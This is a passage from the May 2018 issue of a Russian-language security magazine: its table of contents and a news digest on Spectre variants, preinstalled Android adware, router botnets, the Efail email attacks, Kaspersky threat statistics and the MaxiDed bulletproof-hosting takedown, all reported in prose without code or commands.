                 Editor
        PDF
       Master
    in
Created
                                              Май 2018
            № 230
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Социаль ная инже нерия
  Прак тики, методы и инс трумен ты для социотехнического тестирования

    Разведка на основе открытых источников
  Колон ка Дениса Мак рушина

    Лучшее с мировых ИБ‐кон ференций
  Как взло мать NFC и Apple Pay и уронить человека с гироскутера

    Команда упасть
  Эксплуатируем кри тическую уязвимость в почтовике Exim 4

    Тотальный разгром
  Реверсим Total Commander и обхо дим защиту всех версий

    Кар динг и «чёр ные ящи ки»
  Разбира емся с глав ным на сегод ня спо собом взло ма бан коматов

    Охота на Ено та
  Как вирмейкер спалился сам и спа лил заказчиков

    Пред последняя капля
  Разбира ем уязвимость Drupalgeddon2 в Drupal 7

    Вскрываем кас томный пакер
  На примере GlobeImposter 2.0

    Просто биз нес
  Как Apple защищает дан ные сво их пользователей

    Вскрываем хардверный имплант
  Как устроен девайс для слежки, замаскирован ный под кабель USB

   WWW
  Интересные веб‐сервисы

    Русская «Маг ма»
  Как работа ет оте чествен ный алго ритм блочного шифрования

    Криптуем по‐круп ному
  Разбира емся с режимами работы ГОСТ‐совместимых блочных шифров

    Многофакторная аутентификация по‐взрослому
  Куем серь езный софт с помощью бес платного инструмен тария

   Ми нут ка ненавис ти Android‐раз работ чика
  Разбира ем 10 самых частых проблем кодин га

     JavaScript для умно го дома
  Arduino уста рел, да здравствует ESP32!

    Инструментарий Android‐разработчика
  Под бира ем программы, которые помогут в работе

    Краф товая ФС
  Как быстро сделать свою файловую систему на FUSE и Swift

    Творческая Iskra
  Делаем аппа рат ный менед жер паролей сво ими руками

    Неуловимый Джон
  Как 100 миллионов дол ларов изменили жизнь программиста

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ОПАСНЫЕ ВАРИАНТЫ
Хотя уже почти пол года, как были обнаружены про цес сорные уязвимости
Meltdown и Spectre, едва ли не каждый месяц появляются все новые патчи
для них, иссле дователи находят новые варианты атак и новые проблемы. Увы,
май 2018 года не стал исключением.


Об ход System Management Mode
Специалисты компании Eclypsium предста вили новый вариант атаки на про‐
цессорную уязвимость Spectre (вариант 1). Эксплуати руя этот вектор атаки,
можно получить доступ к данным, которые находят ся под защитой режима
системного управле ния (System Management Mode, SMM).
  Специальный процес сорный режим SMM представлен на процессорах
x86/x86‐64 и подразумевает приостановку исполнения любого другого кода,
вклю чая высоко привилегиро ванное ПО, например ОС и гипервизор. Каждый
раз, когда какой‐либо код направляется в SMM, работа операционной сис‐
темы фактически приоста навливается, а процессор использует части UEFI
или BIOS для выполнения ряда команд с повышенными при вилегиями и дос‐
тупом ко всем дан ным и железу.
  К сожалению, SMM создавался еще в девянос тых годах и серьезной
по современным мер кам защиты в нем не предус мотрено. Так, в процес‐
сорах Intel режим системно го управления защищен посредством специаль‐
ных регистров диапазонов — System Management Range Register (SMRR).
  Специалисты Eclypsium сумели модифицировать один из пуб лично дос‐
тупных эксплоитов для проблемы Spectre вари ант 1 (CVE‐2017‐5753) так, что‐
бы обойти защитный механизм SMRR и получить дос туп к данным внутри Sys‐
tem Management RAM (SMRAM) — области физичес кой памяти, где SMM хра‐
нит информацию и выполняет операции. В результате атакующий получает
возможность извлечь данные из памяти, которая должна быть защищена
SMRR, в том числе из памяти SMM. Более того, эксперты полагают, что, доб‐
равшись до SMRAM и SMM, зло умышленник получит доступ даже к той
информации из физической памяти, которая не связана с SMM.
  Иссле дователи отмечают, что для достижения того же результата можно
использовать и уязвимость Spectre вариант 2 (CVE‐2017‐5715).



      «Так  как  SMM,  в  сущ ности,  име ет  привиле гированный  дос туп
       к физичес кой памяти, вклю чая память, изолированную от ОС, наше
      иссле дова ние демонс трирует, что ата ка на базе Spectre способна
      выявить дру гие сек реты, содер жащиеся в памяти (в том чис ле гипер-
      визора, ОС или приложе ний)», — пишут иссле дова тели.

Представители Intel, которых уведомили о проблеме еще в марте 2018 года,
уверяют, что обычных патчей про тив Spectre вариант 1 и 2 будет достаточно
для защиты от нового вектора атак, описанного экспертами Eclypsium.


Вариан ты 3а и 4
В начале мая 2018 года немецкий журнал Heise со общил, что производители
готовятся раскрыть детали о вось ми новых процессорных уязвимостях, родс‐
твенных проблемам Meltdown и Spectre. Журналисты дали этим багам наз‐
вание SpectreNG. К сожалению, сооб щение, гласившее, что новые уязвимос‐
ти затрагивают процессоры Intel, AMD, некото рые процессоры ARM, а также
IBM Power 8, Power 9 и System z, оказалось правдой. Производите ли уже
опубликовали бюллетени безопас ности, опи сывающие детали двух из восьми
новых проблем.
  Напомню, что баги Meltdown и Spectre были выявлены еще в прошлом
году, но широкой публике известно о них стало лишь в начале 2018 года.
Суммарно в «набор» Meltdown и Spectre вхо дят три CVE: Meltdown (CVE‐2017‐
5754), Spectre вариант 1 (CVE‐2017‐5753) и вариант 2 (CVE‐2017‐5715). Если
Meltdown и Spectre вариант 1 в теории можно исправить на уровне ОС, то
полное исправ ление варианта 2 требует сочета ния обоих подходов и нуж‐
дается в обновлениях прошивки/BIOS/микрокода, из‐за чего у вендоров уже
возникали многочисленные проблемы и накладки.
   Теперь AMD, ARM, IBM, Intel, Microsoft, Red Hat, VMware, Oracle, Cisco,
CERT/CC, US‐CERT и дру гие компании и орга низа ции раскрыли подробности
новых уязвимостей. Как оказалось, проблемы незави симо друг от друга
обнаружили спе циалисты компаний Google и Microsoft. Уязвимостям прис‐
воили идентификаторы вариант 3а (CVE‐2018‐3640) и вариант 4  (CVE‐
2018‐3639). Дело в том, что по классификации специалистов Spectre делится
на вариант 1 (CVE‐2017‐5753) и вариант 2 (CVE‐2017‐5715), а проб лема Melt‐
down (CVE‐2017‐5754) названа вариантом 3. Как нетрудно понять, новый
вариант 3а — вариация бага Meltdown, тогда как более опасный вариант 4,
также получивший имя Speculative Store Bypass, — это производная Spectre.
   Равно как и оригинальные Meltdown и Spectre, новые баги используют
в работе проблемы упрежда ющего (или спекулятивного, speculative) механиз‐
ма исполнения инструкций. Разница заключа ется в том, что Spectre вари‐
ант 4 затрагивает другие области данного механиз ма, в час тности данные,
хранящиеся в store‐буфере, внутри кеша процессора.
  Специалисты Red Hat даже соз дали и выложили специальное видео,
которое объясняет, как уяз вимость влияет на современные процессоры.



      «Ата кующий, успешно экс плу атировав ший данную уяз вимость, сможет
      получить дос туп к привиле гированным данным, за пре дела ми гра ниц
      доверия (trust boundaries)», — пишут экспер ты Microsoft и добав ляют,
      что проблема может быть использована для побега из изолированных
      окру жений.

В свою очередь, эксперт компании Google Янн Хорн (Jann Horn), входивший
в группу исследователей, обнаруживших оригиналь ные Meltdown и Spectre,
уже опубликовал proof‐of‐concept экспло ит для новой уязвимости.
  Эксперты пре дупреждают, что в теории вари ант 4 может быть использован
и удаленно, в том числе через браузеры, с помощью JavaScript‐кода. Впро‐
чем, аналитики Microsoft отмечают, что попыток эксплуатации проблемы
до сих пор зафик сировано не было, а современные браузе ры должны
защищать пользователей от side‐channel‐атак.
   Хотя представители Intel пишут, что ранее выпущенных патчей для Melt‐
down и Spectre дол жно хва тить для защиты от вари анта 4, тем не менее про‐
изводитель анонсировал выход новых патчей (наряду с Red Hat, Microsoft
и другими). Сообщается, что бета‐версии исправлений уже предоставлены
OEM‐производителям и должны дойти до конечных пользовате лей в ближай‐
шие недели (в формате обновлений для ПО и BIOS). Отмечается, что эти
«заплатки» будут поставляться отклю ченными по умолчанию, так как мас‐
совой эксплуатации най денных уязвимос тей эксперты не ожидают. Решение
о включении патчей будут принимать сами пользователи.
   Стоит отметить, что новые пат чи, равно как и предыдущие исправления,
повлияют на производительность уязвимых устройств. Так, Intel сообщает, что
возможна деградация производитель ности на 2–8%, а пред ставители ARM
пишут о снижении производитель нос ти на 1–2%. Разработчики обещают, что
в перспективе планируется снизить эти цифры до меньших значений.


ЛИШЬ 14% ПОЛЬЗОВАТЕЛЕЙ ОБНОВЛЯЮТ ПРОШИВКИ
РОУТЕРОВ
→Специалисты сайта Broadband Genie провели интерес ный опрос среди      простых поль‐зователей, доказавший, что те крайне редко задумываются о безопасности.2205

Так, оказалось, что всего 14% опрошен ных хотя бы раз обновляли про шивку сво их роутеров.

Учетные данные от административного аккаунта и имя Wi‐Fi‐сети по умолчанию меняли лишь
18%.

51% пользователей признались, что никогда не делали ничего из вышепе речисленно го и не
проверяли, какие устройства подключены к их маршрутизатору.

Грустно, но 34% опрошенных признались, что попросту не знают, как выполнить подобные
действия, а еще 48% ответили, что вообще не понимают, зачем это нужно.





МАЛВАРЬ
«ИЗ КОРОБКИ»
Специалисты по информационной безопас ности далеко не в первый раз
обнаруживают вредоносное ПО, установленное на некоторые смартфоны
прямо «из коробки», а также находят серьезные уяз вимости в предус танов‐
ленных приложе ниях.


Cosiloon
Специалисты Avast Threat Labs обна ружили предустановленное рекламное
приложение (adware) Cosiloon на устрой ствах нескольких сотен брендов
и моделей, в том числе ZTE, Archos и myPhone. Полный список уязвимых
устройств можно найти здесь.
  Приложение демонстрирует в браузере всплывающее окно с рекламой
поверх веб‐страниц, и только за пос ледний месяц от него пострадали тысячи
пользователей.  Исследова тели  пишут,  что нашли  последнюю  версию
Cosiloon на 18 тысячах устройств пользователей Avast более чем в 100 стра‐
нах мира, вклю чая Россию, Италию, Германию, Великобританию и США.
По данным Avast, большинс тво зараженных Cosiloon устройств не были сер‐
тифицированы Google.
   Аналитики сообщают, что еще в 2016 году эту же адварь анализировали
специалисты Dr. Web. По оценке специалис тов, угро за существу ет уже более
трех лет.





На протяжении последних нес кольких лет специалисты Avast наблюдали
странные Android‐образцы, поступающие в БД компании. Эти сигнатуры были
похожи на другие образцы рекламного ПО, за исклю чением одного нюанса:
они не имели какой‐либо точки заражения, а имена пакетов подозрительно
походили друг на друга. Вот наиболее рас пространенные из них:
 • google.eMediaService;
 • google.eMusic1Service;
 • google.ePlay3Service;
 • google.eVideo2Service.

До сих пор неясно, как именно адварь попадала на устройства. Злоумыш‐
ленники постоянно загружали на управляющий сервер новые вре доносные
пейлоады, а производители продолжали пос тавлять новые устройства с пре‐
дустановленными приложениями‐дроп перами для скры того разверты вания
мал вари.
  Иссле дователи пишут, что некоторые антивирус ные решения реагируют
на пейлоады злоумышленников, идентифицируя их как мал варь, но это
не слишком помогает. Дело в том, что, даже если мал варь была удалена,
дроппер повторно загружает новую, а так как избавиться от него самого
не так просто, злоумышленники в любое время могут установить на устрой‐
ство не только рекламное ПО, но и прог рамму‐вымогатель, шпионское
ПО или любой другой вредонос.
  Специалисты Avast попытались отключить командный сервер Cosiloon,
отправив запросы на удаление регистра торам домена и провайдерам. Один
из провайдеров, ZenLayer, быс тро ответил на обращение специалистов
и отключил сервер зло умыш ленников, но через некоторое время тот был вос‐
становлен в другом месте. Регистратор домена не отве тил на запросы Avast,
поэтому командный сервер прес тупников по‐преж нему функци они рует.
  Иссле дователи уведомили о проблеме Google, и компания уже предпри‐
няла меры для снижения вредоносной активности многих вари антов при‐
ложения, используя внут ренние технические средства. Так, была обновлена
система  Google  Play  Protect,  чтобы  избежать  подобных  инцидентов
в будущем. Однако в случаях, ког да вредонос ные приложения встроены
в прошивку устрой ства, как это произошло с Cosiloon, решить проблему
может быть довольно трудно. Что бы устра нить ее, представители Google
обратились нап рямую  к разработчикам программно‐аппаратного обес‐
печения.
  Собственное решение Avast (Avast Mobile Security) обнаруживает и уда‐
ляет полезную нагрузку Cosiloon, однако не может получить доступ к отклю‐
чению интегрированного в прошивку дроп пера. В итоге блокировка дроппера
и малвари в основном ложится на Google Play Protect. Пос ле того как Google
Play Protect научился идентифицировать Cosiloon, количество зараженных
устройств значительно снизилось.
   Также пользователи могут уда лить рекламный троян сле дующим образом:
в настройках устрой ства нужно найти дроп пер (он значится под именами
CrashService, ImeMess или Terminal и имеет обычную иконку Android). На стра‐
нице приложения нужно нажать «Отключить» (функция доступна в зависимос‐
ти от версии Android). Как только дроппер будет деактивирован, решение
Avast или другой антивирус ный продукт удалит пей лоад, и малварь больше
не сможет загрузиться на устройство повторно.


Проб лемная клавиату ра LG
Эксперты Check Point Research обна ружили уяз вимости в пре дустановленной
виртуальной клавиатуре флагманских смартфонов LG, протестировав такие
устройства, как LG G4, LG G5 и LG G6.
  Обнаруженные баги могли быть использованы для удаленного выпол‐
нения кода с повышенными привилегиями на мобиль ных устройствах LG. С их
помощью можно было экс плуатировать процессы обновления клавиатуры,
использовать клавиатурного шпиона (keylogger) и таким образом получать
доступ к конфиденциальным пользовательским данным.
  Первая ошибка была связана с функцией рукописного ввода текста
MyScript. Оказалось, что для обновления языка интерфейса устройство под‐
клю чается к внешнему серверу через незащищенное HTTP‐соединение,
через которое можно провести ата ку типа «человек посередине» (man‐in‐the‐
middle). Подобная атака позволяла загрузить на смартфон вредоносный
файл вместо легитимного языково го обновления.
   Вторая уязвимость была связана с местоположением языкового файла.
С помощью обхода катало га атакующий мог изменить расширение файла
и внедрить вредоносное ПО в конфигура ционный файл каталога клавиатуры
LG.
   Разработчики LG рассматривают обнаруженные проблемы как единую
уязвимость с иден тифика тором LVE‐SMP‐170025. Компания уже подготовила
исправления и теперь настоятельно рекомендует пользователям обновить
ОС смартфонов серии G (G5, G6), серии V (Q10, Q10, V8), серии X (X300,
X400, X500).


СТИВ ВОЗ НЯК СЧИТАЕТ, ЧТО В БУДУЩЕМ ETHEREUM
МОЖЕТ СТАТЬ НЕ МЕНЕЕ ВЛИЯТЕЛЬНЫМ, ЧЕМ APPLE





→«Ethereum интересует меня, потому что с его помощью можно делать раз ные вещи, потому
что это платформа»
— Стив Возняк на конференции WeAreDevelopers





ЧТО МОГЛО ПОЙТИ
НЕ ТАК?
На конференции Build 2018 разработ чики Microsoft сделали интерес ное объ‐
явление: скоро в Excel появится поддержка кас томной функциональнос ти
JavaScript. Таким образом, пользователи смогут создавать собс твенные фор‐
мулы, которые будут сохраняться в общей базе. Затем такие формулы можно
будет встав лять в таблицы Excel, причем работать с ними будет JavaScript‐
интерпретатор, а не движок самого Excel.
  Пока поддержка такой кастомной функци ональнос ти JavaScript не реали‐
зована в стабильных релизах и доступна лишь пользователям Developer Pre‐
view для Windows и Mac, а также в Excel Online. Чтобы опробовать новинку,
пользователь должен быть участником прог раммы Oﬃce Insiders.
  Эксперты по информа ционной безопасности вос приняли данный анонс
по‐своему. Сначала интернет заполо нили шутки на тему «что может пойти
не так?», а спустя всего пару дней после объявления специалисты и вовсе
продемонстрировали, что при помощи JavaScript‐функциональнос ти в Excel
можно будет, к примеру, внедрить майнер. В частности, работающий proof‐
of‐concept уже создал Чейз Дардаман (Chase Dardaman).





Дардаман объяснил журналис там издания Bleeping Computer, что в нас‐
тоящее время кастомная JavaScript‐функциональность работает следующим
образом. При создании новой формулы соз даются три файла, хранящиеся
на сервере: файл JS, содержащий кастомное уравнение, файл HTML, отве‐
чающий за загрузку тво их JavaScript‐фай лов, а также файл конфигурации
JSON. Кроме того, понадобится соз дать локаль ный файл XML, который будет
играть роль манифеста.
  Во время использования такого уравнения Excel, в сущности, создает
скрытый браузер, который подгружает необходимые файлы, а затем выпол‐
няет кастомные JavaScript‐функции. Исследователь пишет, что ему не сос‐
тавило труда создать собственную «формулу», которая загружает в скрытый
браузер приложения майнер Coinhive. При этом специалист подчеркнул, что
ранее никогда не работал с Excel и его макросами в таком ключе, но справил‐
ся с задачей всего за час. В результате скрытый майнер, работающий в Mi‐
crosoft Excel Web Content, нагрузил CPU тес товой машины на 206%.





Эксперт пишет, что пока данная функциональность в Excel находится в стадии
тестирования и о массовых атаках речи идти не может, однако со вре менем
она выйдет из беты, и тогда зло умышленники определенно не оставят
это нововведение без внимания.


АУДИТОРИЯ TELEGRAM УМЕНЬШИЛАСЬ ЛИШЬ НА 7%
В середине мая, выждав ровно месяц с момен та начала блокировки Telegram (напомню, что суд
постановил приступить к немедленной блокировке мес сен джера 13 апреля 2018 года), раз‐
работчики Crosser Bot проанализировали активность почти трех мил лионов подписчиков рус‐
скоязычных каналов. Оказалось,  что активность пользователей уменьшилась очень нез‐
начительно.


Доля русскоязычных пользователей, побывавших в сети за неделю до и после бло кировки,
уменьшилась на 7%. Для зарубежных каналов этот показатель равен 5%.

Реальное снижение активности в Рос сии специалис ты оценили примерно в 2%.

Среднее количество просмотров пос тов в день упало на 15% по срав нению с апрельскими
показателями.

Среднее количество постов в день снизилось только на 2%.





Стоит сказать, что, общаясь с представителями ТАСС, руководитель Рос комнадзора Александр
Жаров оценил деградацию мессен джера в 15–40%:

→«Блокировка сложного мессенджера Telegram — это процесс. Диалог этот про должается.
В настоящее время деградация сервиса составляет в течение суток от 15 до 35–40% на раз‐
личных смартфонах. Я полагаю, что в ближайшие месяцы мы дос тигнем большего эффекта.
В настоящее время отток рекламы из Telegram‐каналов составляет порядка 25%, отток поль‐
зователей тоже колеблется в пределах порядка 25%. Это связано с тем, что с Telegram ста‐
новится неудобно работать».





ШЕСТЬ БОТНЕТОВ
АТАКУЮТ РОУТЕРЫ
В начале мая 2018 года ИБ‐специалис ты предупредили, что роуте ры DASAN
GPON подвержены сразу двум серь езным уязвимостям, патчей для которых
на тот момент не существовало: CVE‐2018‐10561 и CVE‐2018‐10562 (обход
аутентификации и удаленное исполнение произвольного кода). Хуже того,
PoC‐эксплоит уже был опуб ликован в открытом доступе.
   Тогда эксперты пришли к выводу, что за право заразить роутеры DASAN
GPON малварью соревнуются уже не отдельные хакерские группы, а сразу
пять крупных и хорошо извес тных аналитикам ботнетов: Hajime, Mettle, Mirai,
Muhstik и Satori. К счастью, в четырех случаях из пяти (Hajime, Mirai, Muhstik,
Satori) эксплоиты для роутеров были написа ны с ошибками, из‐за чего атаки
на устройства DASAN GPON не давали никаких результатов. Эксплоиты бот‐
нета Mettle, впрочем, работают как должно, однако управляющий сервер бот‐
нета не функционировал, так что успешных заражений с этой стороны зафик‐
сировано не было.
  Позже специалисты Qihoo 360 Netlab со общили, что опе раторы еще одно‐
го ботнета присоединились к происходящему, но эксплуатируют не только
перечисленные уязвимости, но и ранее неизвес тный 0day‐баг. Пока эксперты
не раскрыли деталей новой проблемы, однако рас ска зали, что протестирова‐
ли пейлоад на двух различных моделях роутеров DASAN GPON и тот отлично
сработал.
  По данным специалистов, за атаками на уяз вимость нулевого дня стоит
ботнет TheMoon, известный с 2014 года. Рань ше он заражал преимущес твен‐
но серверы Linux, но в пос леднее время переключился на различные IoT‐
устройства.
   Согласно официальным заявлениям представителей DASAN, уязвимостям
подвержены модели серий ZNID‐GPON‐25xx и GPON ONT H640, а общее
количество уязвимых роутеров в интернете составляет 240 тысяч устрой ств
или даже меньше.
  При этом разработчики пояс нили, что DZS ZNID‐GPON‐25xx и ONT серии
H640 были разработаны OEM‐пос тавщиком и перепродавались DZS (DASAN
Zhone Solutions). Более того, устройства были выпущены девять лет назад и к
настоящему моменту былые контракты и догово ренности уже не актуальны,
а девайсы «отслужили свое». Хотя компания заверяет, что уведомила о проб‐
лемах всех клиентов, работа ющих с уяз вимым оборудовани ем, и в каждом
отдельном случае проблему решают индивиду ально, судя по всему, патчей
для опасных уязвимостей в скором будущем можно не ждать.
  По подсче там Qihoo 360 Netlab, в настоящее вре мя лишь 2% роутеров
стали жертвами ботнетов, «охотящихся» на уяз вимые девайсы. К сожалению,
эксперты полагают, что обнаружение 0day‐бага может существенно изменить
эту статистику.


500 000 РУБ ЛЕЙ В ДЕНЬ ЗАРАБА ТЫВАЛА РОС СИЙСКАЯ
ХАК‐ГРУППА ПРИ ПОМОЩИ ANDROID‐ТРОЯНА
В Волгоградской области задержали 32‐летнего учас тника хак‐груп пы, которая с помощью An‐
droid‐трояна похищала деньги со счетов рос сийских пользовате лей.


Банкер был замаскирован под финан совое приложение «Бан ки на ладони». Оно выполняло
роль агрегатора систем мобильного бан кинга ведущих банков страны. Например, к приложе‐
нию можно было под ключить банковские карты, чтобы не носить их с собой. Разуме ется, все
данные о сохраненных картах вредонос передавал своим опе раторам.


Операторы переводили деньги пользовате лей на заранее подготов ленные счета, суммами
от 12 000 до 30 000 рублей за один перевод. SMS‐коды под тверждения операций перех‐
ватывали на телефонах жертв.

Поначалу злоумышленники в среднем похищали от 100 000 до 300 000 рублей ежедневно,
но затем эта цифра возросла до 500 000 рублей в день. Часть денег в целях маскиров ки
и более безопасного вывода средств переводили в крип товалюту.





                                     Продолжение статьи →
← Начало статьи





 ОБНОВЛЕНИЯ
 ДЛЯ ANDROID
 ОБЯЗАТЕЛЬНЫ!
  Проблема безопасности устройств на базе Android стоит очень остро
  с самого момента появления мобильной ОС компании  Google. Тогда
   как устройства самой Google получают обновления безопас ности регулярно,
   того же нельзя сказать обо всем спектре OEM‐девайсов, выпус каемых дру‐
  гими производителями. Так, совсем недавно ИБ‐специалисты вы яснили, что
  порой даже крупные про изво дители попросту лгут о выходе патчей, а на
  самом деле обновле ний не выпус кают.
     К сожалению, специалис ты Google не имеют воз можнос ти контролировать
   всех OEM‐произво дителей, хотя компания давно предпринимает шаги в дан‐
  ном направлении. К примеру, в прош лом году был запущен проект Treble,
  принесший значительные изменения архи тектуры Android и поз воливший
  производителям создавать и использовать универсальные компоненты под‐
  держки оборудования, которые не привяза ны к конкретным версиям Android
  и лежащим в их основе ядрам Linux.
     Хотя запуск Treble повлиял на ситуацию, изменив ее в лучшую сторону,
   в Google считают, что этого недос таточно. Так, стало извес тно, что после
  релиза Android P Google начнет принуж дать сторонних производителей
   регулярно обновлять свои устройства.
     Данное решение было анонсировано на прошедшей недавно конферен‐
  ции Google I/O Developer Conference, и портал XDA Developers цитирует главу
  безопасности Android Дэвида Клайдермахера (David Kleidermacher), который
  обещает, что новое сог лашение для OEM‐производителей поз волит «зна‐
   чительно  увеличить  количество  устрой ств  и  пользователей,  регулярно
  получающих обновле ния безопас ности».
    Пока текст нового сог лашения не был опубликован, поэтому остается
  неясным, будут ли новые усло вия распростра нять ся только на флагманские
  решения компаний, на все новые устройства с Android P на борту, или же
  изменения затронут и старые гаджеты, уже пос тупившие в продажу. Как бы то
  ни было, желание Google обязать OEM‐производителей регулярно выпус кать
  обновления  безопасности  должно  положитель ным  образом  повлиять
  на огромный и разрозненный рынок Android‐устройств.


  ХУАН ЖЭНЬСЮНЬ ПРОКОММЕНТИРОВАЛ НОВОСТЬ
 О ТОМ, ЧТО ТОЛЬКО В ПЕРВОМ КВАРТАЛЕ 2018 ГОДА
 МАЙНЕРЫ ПРИНЕСЛИ КОМПАНИИ 289 МИЛЛИОНОВ ДОЛ‐
  ЛАРОВ ПРИБЫЛИ





  →«Майнеры криптовалют приобрели много наших GPU в этом квартале, из‐за чего цены пошли
   вверх. Полагаю, из‐за этого многие геймеры не смог ли купить себе новый GeForce»
  — Хуан Жэньсюнь, президент и CEO кор порации Nvidia





 НЕ ПОЛНЫЙ EFAIL
  В начале мая группа из девяти европейских ученых во главе с профессором
  Университета прик ладных наук в Мюнстере Себастьяном Шинцелем (Sebast‐
   ian  Schinzel) предупредила о критичес ких  уяз вимостях  в составе PGP
  и  S/MIME.  Экспертов  поддержа ли  предста вители Фонда  электронных
  рубежей (Electronic Frontier Foundation). Они подтвердили критичность обна‐
  руженных проблем и опубликова ли сооб щение, в котором призвали поль‐
  зователей отклю чить или деинсталлировать инструменты работы с PGP
  и S/MIME. Сообщалось, что исправлений для проб лем пока нет, в качестве
  альтернативного способа защищен ной свя зи пользователям советовали
  обратить внимание на мес сенджер Signal.
      Чуть позже были обна родо ваны все технические подробнос ти обнаружен‐
  ных багов: с ними можно озна комиться на офи циальном сайте efail.de и в
  официальном док ладе экспертов (PDF).
     Как выяснилось, раз работчики и специалис ты по безопас ности были
   отчасти правы, когда призывали не паниковать и называли проблему Efail оче‐
  редным хайпом. Оказалось, что с самими тех нологиями и криптографией все
   в порядке, а проблемы кро ются в их имплементациях и окружающей экосис‐
   теме. В частности, уяз вимы почтовые клиенты (Thunderbird, Outlook, Apple
   Mail) и PGP‐плагины для них (Enigmail, Gpg4win и GPG Tools соответс твенно).





  Более того, для эксплуатации уяз вимостей ата кующему сначала придется
   получить доступ к переписке своей жертвы, то есть предварительно потребу‐
   ется произвести атаку на почтовый сервер, взло мать чужую почту или перех‐
   ватить трафик посредством атаки man‐in‐the‐middle.





  В сущности, атака под разумевает, что злоумышленник, уже заполучивший
   в свое рас поряжение зашифрованные пись ма, оснастит их HTML‐тегами
  и хитростью заставит оригинального отправителя (или одного из реципи‐
   ентов) открыть ставшее вредоносным пос лание.
     Эксплуатация проб лем тесно сопряжена с тем, как почтовые клиенты и их
  плагины обрабатывают HTML и ссылки на внеш ние источники, к примеру
  изображения и стили, подгру жаемые с внеш них URL.
    Дело в том, что почтовые клиенты, как правило, сконфигурированы таким
  образом,  чтобы  автоматичес ки дешифровать содержимое защищенных
  писем. Если клиент при этом еще и автоматичес ки подгружает данные
  из внешних источников, этим могут воспользоваться атакующие, прислав
  своей цели модифицированную версию зашифрованного послания и в конеч‐
  ном итоге получив его расшифрованную копию.
      Так, атакующий может использовать теги img или  style, разместив их
   в незашифрованной час ти HTML‐писем  (а именно в MIME‐заголовках),
   как показано на иллюстрации ниже. Фактически письмо превращается в multi‐
   part HTML‐сообщение, и внутри тега содержится зашифрованный текст.
  В итоге, когда уязвимый клиент будет рас шифровывать это пос лание, он
  перейдет к автоматичес кой обра ботке HTML и отправит уже дешифрованный
   текст злоумышленнику в рамках использованного тега.





  Еще один способ атаки, предложенный исследова телями, предполагает экс‐
   плуатацию  уязвимостей  в  спецификаци ях  OpenPGP  (CVE‐2017‐17688)
  и S/MIME (CVE‐2017‐17689) и манипуляции блоками шифротекста в режимах
  CBC и CFB. В данном случае также используют ся HTML‐теги.





         «Как только жер тва откроет письмо в своем поч товом клиенте, под-
         став ной шиф ротекст будет рас шифрован: вна чале приватный ключ
        жер твы используется для рас шифров ки клю ча сес сии s, а затем ключ
         сес сии — для рас шифров ки под став ного шиф ротек ста c. В результате
        бла года ря манипу ляциям рас шифрованный  текст будет содер жать
         канал эксфильтра ции [данных], нап ример HTML-гипер ссылку. Этот
         канал затем будет использован для отправ ки рас шифрованного тек ста
         ата кующе му (целиком или его час ти)», — пишут иссле дова тели.

  Теперь многие специалис ты говорят о том, что высказанные ранее советы
  полностью отказаться от PGP и S/MIME были явно чрезмерны ми, ведь
  защититься от уязвимостей можно более прос тыми путями: использовать
  не подверженные проб лемам почтовые клиенты и плагины, отключить авто‐
  матическую обработку HTML и так далее.
     Известный криптограф профессор Универ ситета Джона Хопкинса Мэттью
  Грин (Matthew Green) пишет, что, с одной стороны, Efail — это атака‐шедевр,
   но, с другой стороны, она вряд ли получит широкое распространение и ско‐
  рее представляет угрозу для корпоративной среды, активис тов, журналистов
  и так далее.





  «ЛАБОРАТОРИЯ КАС ПЕРСКОГО» ПОСЧИТАЛА УГРОЗЫ
 В ПЕРВОМ КВАРТАЛЕ 2018 ГОДА
   Эксперты «Лаборатории Касперского» опубликовали отчет, пос вященный угрозам в первом
   квартале 2018 года. Аналитики предупредили, что эксплоитов для Microsoft Ofﬁce становится
   все больше, а активность мобильной малвари нем ного снизилась.

  В первом квартале 2018 года было обнаружено 1 322 578 вредонос ных установочных пакетов,
   что на 11% меньше, чем в предыдущем квар тале.





   Также были замечены 18 912 установочных пакетов мобильных банковских троянцев и 8787
   установочных пакетов мобильных троянцев‐вымогателей.





              Распределение новых детектируемых мобильных программ по типам

   Зафиксировано 282 807 433 уникальных URL, на которых происходило срабатывание
   веб‐антивируса.


   Попытки запуска вредоносного ПО для кражи денежных средств через онлайн‐дос туп к банков‐
   ским счетам отражены на компьютерах 204 448 пользователей.

   Атаки шифровальщиков отражены на компьютерах 179 934 уникальных пользовате лей.

   Более чем в два раза по сравнению со средним показателем за 2017 год возросла доля экс‐
   плоитов для Microsoft Ofﬁce (47,15%). Это вдвое превышает квартальный показатель пос тоян‐
   ного лидера прошлых лет — экс плоитов для браузеров (23,47%).

   Самой используемой уязвимостью в Microsoft Ofﬁce в пер вом квартале стал баг CVE-2017-
   11882 — уязвимость класса «перепол нение стека» в старом компоненте офисного пакета
   (редакторе математических формул Equation Editor).


   Доля Flash‐эксплоитов, нап ротив, снижается: за первый квартал 2018 года она сос тавляет чуть
   менее 3%.





  В среднем в течение квартала 24% компьютеров интернет‐пользовате лей в мире хотя бы один
   раз подвергались ата ке вредоносного ПО. Показатель России в этом рейтинге сос тавил 31%.





 MAXIDED АРЕСТОВАН
  Гол ландские правоох ранители отчитались о совмес тной операции, про‐
  веденной с коллегами из дру гих стран. Закрыли «пуленепробиваемый» хос‐
   тинг MaxiDed, работав ший с 2008 года и агрессивно рекламировавшийся
  на хакерских ресурсах. На хостинге раз мещались управля ющие серверы
  DDoS‐ботнетов, сайты с детской порнографией, вредоносная реклама, спа‐
  меры и так далее.
     Согласно архивной версии сайта MaxiDed, ресурс предлагал своим кли‐
  ентам выделенные серверы, VPS и VPN, а его операторы утверждали, что вла‐
  деют примерно 2500 серверами у 30 про вай деров из 82 раз ных стран мира,
  а хостингом пользовались более 300 тысяч человек.
     MaxiDed  позиционировался  как  «пуленеп робиваемый»  хос тинг —
   это означает, что все жалобы на противо законную активность его клиентов
  оставались без внимания, а личности пользователей хранились в тайне.
  В последние годы подобных сервисов появилось немало, и властям редко
  удается что‐либо с ними поделать, так как их операторы занимаются нас‐
  тоящим юридическим крючкотворс твом и надежно защищаются от любых
  претензий при помощи запутанных и прос транных пользовательских сог‐
  лашений.
    По данным специалис тов Trend Micro и SpoofIt, в пос ледние годы MaxiDed
  использовала известная группа правитель ственных хакеров Carbanak, на хос‐
   тинге размещались управляющие серверы ботнетов Mirai, вредонос ные рек‐
  ламные кампании AdGholas, множес тво различных мошенничес ких операций
